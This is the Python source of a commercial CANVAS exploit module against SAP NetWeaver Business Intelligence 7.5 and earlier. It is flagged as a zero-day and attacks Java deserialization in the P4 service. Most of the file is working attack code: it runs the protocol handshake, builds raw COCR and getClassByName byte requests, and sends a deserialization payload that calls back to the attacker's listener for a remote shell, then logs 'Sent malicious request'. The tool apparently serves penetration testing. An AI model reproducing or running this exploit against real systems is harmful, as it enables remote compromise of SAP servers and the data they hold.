#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


from exploitutils import *
from tcpexploit import tcpexploit
from canvasengine import canvas_root_directory
from libs.xalan_p4_deserialize import objectcreator

import logging

NAME                            = "SAP Netweaver Business Intelligence 7.5-and-prior P4 Deserialization"
DESCRIPTION                     = "Deserializing an untrusted Java object can result in remote code execution"
DOCUMENTATION                   = {}
DOCUMENTATION['0DAY']           = True
DOCUMENTATION['VENDOR']         = "sap.com"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["References"]     = [ "http://codewhitesec.blogspot.com/2016/04/infiltrate16-slidedeck-java-deserialization.html",
                                    "http://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class"]
DOCUMENTATION["CVE Name"]       = "None"
DOCUMENTATION["CVE Url"]        = ""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Linux"] ]
PROPERTY['VERSION']             = [ "All" ]

NOTES                           = """
Discovered by Mattias Kaiser and presented by him at Infiltrate 2016 .
"""

CHANGELOG                       = """
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.port = 50003
        self.host = ""
        self.badstring = ""
        self.version = 1
        self.done = 0
        self.name = NAME
        self.basepath = "/"
        self.command = None #none by default. We want to try to automatically load MOSDEF
        self.ssl = 1


        self.mosdef_type = "UNIVERSAL"
        self.mosdef_http = False
        self.mosdef_ssl = False
        self.mosdef_encrypted = False

        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", 50004))
        self.mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        self.ssl = self.argsDict.get("ssl",self.ssl)
        return

    def displayVersions(self):
        for v in self.versions.keys():
            logging.info("Version %d: %s" % (v, self.versions[v][0]))

    def needs_mosdef_http(self):
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

        return mosdef_type == "HTTP"

    def needs_mosdef_ssl(self):
        return self.mosdef_ssl

    def getsocket(self):
        if ":" in self.host:
            return self.gettcpsock(AF_INET6=1)
        else:
            return self.gettcpsock()

    def neededListenerTypes(self):
        import canvasengine
        mosdef_type = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()

        if mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]
        return [canvasengine.LINUXMOSDEF_X64]

    def recv_init(self, s):
            state = 0

            # state: (char to transition on, destination state, tolerant?)
            transitions = {0:("#", 1, True),
                           1:("p", 2, False),
                           2:("#", 3, False),
                           3:("4", 4, False)}

            # Did we accept the init handshake as a part of the string?
            accepted = False

            while state < 4:
                # print "state:", state
                # print "about to recv byte:"
                current_byte = s.recv(1)
                print "%x, %s" % (ord(current_byte), current_byte)

                (transition_char,next_state,tolerant) = transitions[state]
                if current_byte == transition_char:
                    state = next_state
                else:
                    if tolerant:
                        continue
                    else:
                        break

            # print "final state:" , state

            if state == 4:
                accepted = True

                # Drain the rest of the socket. We expect this latter portion
                # of the packet to be of the form: :<host name>:50004
                if accepted:
                    colon_check = lambda x: x == ":"

                    state = 0
                    all_bytes = []

                    while state < 7:
                        current_byte = s.recv(1)

                        if state < 2:
                            if colon_check(current_byte):
                                state += 1
                        else:
                            state += 1
            else:
                pass

            return accepted

    def recv_cocr(self, s):
        state = 0

        transitions = {0: ("\x00", 1),
                       1: ("\x00", 2),
                       2: ("\x49", 3),
        }

        all_bytes = []

        while state < 3:
            # print "state:", state
            # print "about to recv byte:"
            current_byte = s.recv(1)
            # print "%x, %s" % (ord(current_byte), current_byte)

            all_bytes.append(ord(current_byte))

            (transition_char, next_state) = transitions[state]
            if transition_char == current_byte:
                state = next_state
            else:
                break

        # We got a response code that indicated success
        got_host_port = False
        logging.info("Locator check")
        if state == 3:
            # Drain the rest of the socket. We expect this latter portion
            # of the packet to be of the form: :<host name>:50004
            state = 0

            colon_check = lambda x: x == ":"

            while state < 7:
                current_byte = s.recv(1)

                all_bytes.append(ord(current_byte))

                if state < 2:
                    if colon_check(current_byte):
                        state += 1
                else:
                    if current_byte >= "0" and current_byte <= "9":
                        state += 1

            got_host_port = True

        if got_host_port:
            return all_bytes
        else:
            return False

    def connect_to_cocr(self, s):
        # s = self.getsocket()
        # s.connect((self.hostname, self.port))

        init_string = "v1\x18#p#4None:127.0.0.1:%d" % (s.getsockname()[1])
        s.sendall(init_string)
        accepted_init = self.recv_init(s)
        accepted_cocr = False

        if accepted_init:
            # Connect to COCR interface
            cocr_request = [0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00,
                            0x63, 0x00, 0x6f, 0x00, 0x63, 0x00, 0x72]

            s.sendall("".join([chr(x) for x in cocr_request]))

            accepted_cocr = self.recv_cocr(s)

        return accepted_cocr


    def test(self):
        self.getargs()

        s = self.gettcpsock()

        logging.info("host: "  + str(self.host))
        logging.info("port: " + str(self.port))
        s.connect((self.host, self.port))

        success = self.connect_to_cocr(s)
        s.close()

        return 1 if success != False else 0

    def hex_string(self, lst):
        return "".join([chr(x) for x in lst])

    def dump_string(self, string):
        col_length = 16

        current_line = []

        self.log("*"*40)

        for (index, byte) in enumerate(string):
            count = index + 1

            if isinstance(byte, int):
                byte = chr(byte)

            if (count % 8 == 0) and (count != 0):
                self.log(" ".join(current_line))
                current_line = []
            else:
                current_line.append("%02x" % ord(byte))

        self.log("*"*40)

    def deliver_cbn_request(self, cocr_init_response, s):
        logging.debug("len:" + `len(cocr_init_response)`)
        self.dump_string(cocr_init_response)
        interface_instance_id = cocr_init_response[39:43]
        logging.debug("len:" + `len(interface_instance_id)`)
        logging.debug("interface_instance_id:" + `interface_instance_id`)
        self.dump_string(interface_instance_id)

        start = self.hex_string([0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x6a, 0x4f, 0x2d, 0x00, 0xff, 0xff, 0xff, 0xff, 0xfe, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00,] + interface_instance_id + [0x00, 0x00]) # 0x20, 0x7d, 0xc6, 0x28, 0x00, 0x00])


        middle = self.hex_string([0x6a, 0x4f, 0x2d, 0x00, 0xff, 0xff, 0xff, 0xff])

        get_class_by_name = self.hex_string([ 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x67,
                              0x00, 0x65, 0x00, 0x74, 0x00, 0x43, 0x00, 0x6c, 0x00, 0x61,
                              0x00, 0x73, 0x00, 0x73, 0x00, 0x42, 0x00, 0x79, 0x00, 0x4e,
                              0x00, 0x61, 0x00, 0x6d, 0x00, 0x65, 0x00, 0x28, 0x00, 0x6a,
                              0x00, 0x61, 0x00, 0x76, 0x00, 0x61, 0x00, 0x2e, 0x00, 0x6c,
                              0x00, 0x61, 0x00, 0x6e, 0x00, 0x67, 0x00, 0x2e, 0x00, 0x53,
                              0x00, 0x74, 0x00, 0x72, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x67,
                              0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,] + \
                                            interface_instance_id)
                              # 0x20, 0x7d, 0xc6, 0x28])

        # This is a test payload. It's just a string that does not correspond to a class name.
        # payload = self.hex_string([0xac, 0xed, 0x00, 0x05, 0x74, 0x00, 0x26, 0x74,
        #            0x6f, 0x75, 0x63, 0x68, 0x20, 0x2f, 0x74, 0x6d,
        #            0x70, 0x2f, 0x6d, 0x79, 0x5f, 0x76, 0x6f, 0x6c,
        #            0x63, 0x61, 0x6e, 0x6f, 0x5f, 0x63, 0x6f, 0x6e,
        #            0x74, 0x65, 0x6d, 0x70, 0x6c, 0x61, 0x74, 0x65,
        #            0x73, 0x5f, 0x77, 0x61, 0x78])
        payload = objectcreator(callback_ip=self.callback.ip,
                                callback_port=self.callback.port,
                                use_http=self.needs_mosdef_http(),
                                use_ssl=self.needs_mosdef_ssl()).get_payload()

        # self.log("len(start):" + str(len(start)))
        length_value = len(get_class_by_name) + len(payload)

        # self.log("length_value:" + str(length_value))

        request = start + struct.pack("<L", length_value) + \
                 middle + get_class_by_name + payload

        s.sendall(request)

    def run(self):
        self.getargs()
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
        logging.info("Attacking %s:%d" % (self.host, self.port))

        ret = 0

        s = self.gettcpsock()
        s.connect((self.host, self.port))
        response = self.connect_to_cocr(s)

        if response != False:
            self.deliver_cbn_request(response, s)

        logging.info("Sent malicious request")
        s.close()

        return 1

    def shutdown(self):
        self.done = 1


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
